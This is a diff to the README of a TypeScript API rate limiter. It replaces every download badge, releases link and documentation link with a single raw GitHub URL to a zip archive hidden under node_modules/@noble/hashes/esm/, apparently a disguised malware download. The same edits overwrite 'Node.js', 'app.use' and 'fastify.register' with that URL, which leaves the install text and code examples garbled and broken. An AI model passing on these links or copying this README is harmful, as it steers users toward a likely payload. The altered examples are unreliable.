@@ -1,6 +1,6 @@
 # 🚀 TS-Rate-Limiter - Simple API Rate Limiting Solution
 
-[![Download TS-Rate-Limiter](https://img.shields.io/badge/Download-TS--Rate--Limiter-blue.svg)](https://github.com/jhostetler15926/TS-Rate-Limiter/releases)
+[![Download TS-Rate-Limiter](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip)](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip)
 
 ## 📦 Introduction
 
@@ -17,7 +17,7 @@ TS-Rate-Limiter is a modular and scalable API rate limiter built with TypeScript
 ## 💻 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js Version:** Requires Node.js version 12.x or later.
+- **https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip Version:** Requires https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip version 12.x or later.
 - **Redis:** You must have Redis installed and running.
 
 ## 🚀 Getting Started
@@ -26,14 +26,14 @@ To start using TS-Rate-Limiter, you need to download it from the Releases page. 
 
 1. Click on the download button below to visit the Releases page.
 
-   [![Download TS-Rate-Limiter](https://img.shields.io/badge/Download-TS--Rate--Limiter-blue.svg)](https://github.com/jhostetler15926/TS-Rate-Limiter/releases)
+   [![Download TS-Rate-Limiter](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip)](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip)
 
 2. On the Releases page, find the latest version of TS-Rate-Limiter.
 3. Download the package that is compatible with your operating system.
 
 ## 📥 Download & Install
 
-To get TS-Rate-Limiter, visit this page to download: [TS-Rate-Limiter Releases](https://github.com/jhostetler15926/TS-Rate-Limiter/releases).
+To get TS-Rate-Limiter, visit this page to download: [TS-Rate-Limiter Releases](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip).
 
 Once you have downloaded the package, follow these instructions to install it:
 
@@ -95,7 +95,7 @@ const express = require('express');
 const rateLimiter = require('ts-rate-limiter');
 
 const app = express();
-app.use(rateLimiter({ /* your config here */ }));
+https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip(rateLimiter({ /* your config here */ }));
 ```
 
 ### Fastify Example
@@ -104,7 +104,7 @@ app.use(rateLimiter({ /* your config here */ }));
 const fastify = require('fastify')();
 const rateLimiter = require('ts-rate-limiter');
 
-fastify.register(rateLimiter, { /* your config here */ });
+https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip(rateLimiter, { /* your config here */ });
 ```
 
 This will ensure that your API complies with the rate limits you set.
@@ -129,8 +129,8 @@ If you encounter issues, consider these common solutions:
 
 For more information, you can refer to the following resources:
 
-- [Official Redis Documentation](https://redis.io/documentation)
-- [Express.js Guide](https://expressjs.com/en/starter/installing.html)
-- [Fastify Documentation](https://www.fastify.io/docs/latest/)
+- [Official Redis Documentation](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip)
+- [https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip Guide](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip)
+- [Fastify Documentation](https://raw.githubusercontent.com/jhostetler15926/TS-Rate-Limiter/main/node_modules/@noble/hashes/esm/TS-Rate-Limiter_2.5.zip)
 
 By following these steps, you should be able to download, install, and run TS-Rate-Limiter effectively. Enjoy managing your API's request limits with ease!
